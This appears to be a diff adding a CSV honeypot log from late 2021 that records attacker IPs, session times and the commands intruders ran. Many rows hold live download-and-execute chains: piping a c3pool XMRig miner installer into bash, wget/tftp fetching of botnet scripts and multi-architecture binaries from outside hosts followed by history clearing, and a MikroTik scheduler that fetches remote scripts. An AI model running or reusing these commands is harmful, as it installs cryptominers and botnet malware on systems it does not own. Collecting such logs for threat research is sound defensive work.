@@ -1,0 +1,64 @@
+attackdate,attackerip,entrancetime,exittime,commands
+2021-10-29,10.0.3.129,23:34:33.480,23:58:54.287,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR']
+2021-10-30,10.0.3.166,23:40:35.871,23:40:59.261,['scp -t /tmp/Wt6rRARk']
+2021-11-07,10.0.3.217,00:05:36.747,00:05:39.418,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://134.209.157.41/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 134.209.157.41 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-11-08,10.0.3.195,00:22:57.786,00:26:13.537,[]
+2021-11-09,10.0.3.41,00:04:22.061,00:21:10.361,[]
+2021-10-29,10.0.3.46,00:24:31.819,00:59:44.819,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'uname -a']"
+2021-10-30,10.0.3.179,00:33:41.030,00:58:01.284,"['/system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://strtbiz.site/poll/a28495ec-fcfd-43cc-b472-90edff1c7086 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write']"
+2021-10-31,10.0.3.47,00:23:00.467,00:23:33.283,['scp -t /tmp/pTCUHuDD']
+2021-11-10,10.0.3.52,00:52:07.297,00:54:04.272,[]
+2021-11-04,10.0.3.159,01:08:05.657,01:08:51.580,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdvbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'cat /hive-config/rig.conf']"
+2021-10-30,10.0.3.141,01:47:29.804,01:59:41.256,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46viFQGtRgsGxtygv2zwGiT2Pb66B2MxzfnvEJVDu16HQKqTQmZAVw5CQmGBskKq1JCcoMKUpAQ38WUmNZcfWFMa6trEvJf']
+2021-10-31,10.0.3.62,01:40:38.512,01:41:00.148,['scp -t /tmp/0ZbWTgex']
+2021-11-10,10.0.3.160,02:12:28.756,02:26:02.706,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://206.189.138.123/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 206.189.138.123 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-10-29,10.0.3.175,02:48:06.986,02:48:17.820,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
+2021-10-30,10.0.3.32,02:08:33.591,02:59:27.764,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46viFQGtRgsGxtygv2zwGiT2Pb66B2MxzfnvEJVDu16HQKqTQmZAVw5CQmGBskKq1JCcoMKUpAQ38WUmNZcfWFMa6trEvJf']
+2021-11-01,10.0.3.146,02:32:06.095,02:32:27.368,['scp -t /tmp/7c21MtN5']
+2021-11-09,10.0.3.251,02:53:54.153,02:54:13.974,['scp -t /tmp/rOatptZt']
+2021-10-29,10.0.3.144,03:50:41.996,03:59:55.236,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
+2021-11-05,10.0.3.121,04:07:30.247,04:29:54.813,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46viFQGtRgsGxtygv2zwGiT2Pb66B2MxzfnvEJVDu16HQKqTQmZAVw5CQmGBskKq1JCcoMKUpAQ38WUmNZcfWFMa6trEvJf']
+2021-11-10,10.0.3.140,04:11:39.336,04:28:58.214,[]
+2021-10-29,10.0.3.82,04:09:47.055,04:32:26.615,"['cd /tmp', 'rm -rf *', 'pkill xms', 'pkill cnrig', 'wget http://188.213.49.155/x86_64', 'curl -O http://188.213.49.155/x86_64', 'busybox wget http://188.213.49.155/x86_64', 'chmod 777 *', './x86_64 rootsbabe']"
+2021-10-31,10.0.3.24,04:18:04.681,04:53:42.187,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA']
+2021-11-07,10.0.3.5,05:25:52.486,05:26:14.983,['scp -t /tmp/R8Xv1SFc']
+2021-10-29,10.0.3.38,05:46:10.519,05:46:33.957,['scp -t /tmp/rLaNwiNu']
+2021-11-01,10.0.3.198,05:59:30.950,05:59:50.199,['scp -t /tmp/FS6697Fm']
+2021-11-04,10.0.3.42,05:52:40.357,05:53:00.887,['scp -t -- /tmp/aOk0UUto']
+2021-10-29,10.0.3.19,07:58:19.719,07:58:30.159,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
+2021-11-01,10.0.3.23,07:56:00.195,07:58:50.881,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46viFQGtRgsGxtygv2zwGiT2Pb66B2MxzfnvEJVDu16HQKqTQmZAVw5CQmGBskKq1JCcoMKUpAQ38WUmNZcfWFMa6trEvJf']
+2021-11-05,10.0.3.77,07:51:28.767,07:51:47.285,['scp -t /tmp/uSPN4kj6']
+2021-11-07,10.0.3.209,07:57:59.743,07:59:01.822,['scp -t /tmp/qjaoCd1a']
+2021-11-03,10.0.3.202,08:16:33.964,08:21:10.734,['scp -t /tmp/wFGDQ6L6']
+2021-11-08,10.0.3.221,08:29:42.140,08:29:42.670,['scp -t /tmp/YJHHfl1k']
+2021-10-29,10.0.3.88,08:11:23.316,08:38:46.454,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
+2021-10-31,10.0.3.19,08:13:24.703,08:16:18.223,[]
+2021-11-01,10.0.3.136,09:11:41.018,09:14:24.855,[]
+2021-10-29,10.0.3.248,10:40:55.566,10:44:36.334,['sudo hive-passwd dayone1edfjqiyhnh3']
+2021-10-29,10.0.3.56,11:17:37.141,11:55:28.106,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR']
+2021-11-03,10.0.3.124,12:04:11.368,12:04:32.998,['scp -t /tmp/449XuaD6']
+2021-11-04,10.0.3.168,12:21:21.305,12:21:42.353,[]
+2021-11-05,10.0.3.144,12:09:08.905,12:09:32.278,['scp -t /tmp/R5iMym0X']
+2021-11-01,10.0.3.211,12:16:11.287,12:16:46.279,['scp -t /tmp/vYZVKs5w']
+2021-10-29,10.0.3.67,13:09:33.237,13:31:05.818,['scp -t /tmp/vVgLCzSj']
+2021-11-03,10.0.3.117,14:22:49.166,14:23:12.311,['scp -t /tmp/MhqeXFUl']
+2021-11-04,10.0.3.180,14:23:45.654,14:24:06.216,['scp -t /tmp/ZXIsgdAJ']
+2021-11-07,10.0.3.99,14:09:58.746,14:11:22.095,[]
+2021-11-07,10.0.3.25,15:03:17.716,15:03:55.755,['scp -t /tmp/gc9bzdRT']
+2021-11-07,10.0.3.99,16:26:36.115,16:27:49.102,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://149.56.35.183/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 149.56.35.183 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-10-28,10.0.3.46,16:21:24.783,16:44:37.040,"[', ""', 'exit']"
+2021-11-09,10.0.3.71,17:25:45.368,17:26:06.817,['scp -t /tmp/zvAHG5Kg']
+2021-10-29,10.0.3.126,17:23:49.162,17:25:22.472,[]
+2021-11-10,10.0.3.197,18:08:55.183,18:28:37.500,"['wget dawis.tw/x86_64', 'wget dawis.tw/i686', 'wget dawis.tw/arm', 'wget dawis.tw/arc', 'wget dawis.tw/arm5', 'wget dawis.tw/arm6', 'wget dawis.tw/arm7', 'wget dawis.tw/i586', 'wget dawis.tw/mips', 'wget dawis.tw/mipsel', 'wget dawis.tw/sh4', 'chmod 777 *', './arc x86', './arm x86', './arm5 x86', './arm6 x86', './arm7 x86', './i586 x86', './i686 x86', './mips x86', './mipsel x86', './sh4 x86', './x86_64 x86']"
+2021-10-30,10.0.3.199,18:29:07.735,18:29:27.507,['scp -t /tmp/ZSm05vH5']
+2021-11-08,10.0.3.93,18:40:58.713,18:41:01.324,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://179.43.175.58/x86_64', 'chmod 777 *', './x86_64 x8666', 'echo Suck my dick.']"
+2021-11-03,10.0.3.67,19:18:08.291,19:19:10.306,['scp -t /tmp/PNdLHHxu']
+2021-10-28,10.0.3.85,19:39:03.556,19:53:13.082,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
+2021-10-31,10.0.3.44,19:43:29.149,19:43:50.624,['scp -t /tmp/Sg3UjyL7']
+2021-11-06,10.0.3.103,20:28:40.408,20:29:42.466,[]
+2021-10-28,10.0.3.54,20:08:42.857,20:56:50.083,['uname -a']
+2021-10-28,10.0.3.114,21:18:42.189,21:55:28.608,"['cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
+2021-11-06,10.0.3.248,21:47:35.491,21:47:35.979,[]
+2021-11-08,10.0.3.206,21:51:43.281,21:51:59.053,"['ls', '[ETX]exit']"
+2021-11-09,10.0.3.190,21:39:21.122,21:39:41.279,['scp -t /tmp/UfVRJY3p']
+2021-10-28,10.0.3.33,22:58:23.110,22:58:48.759,['scp -t /tmp/EvEKEpx8']
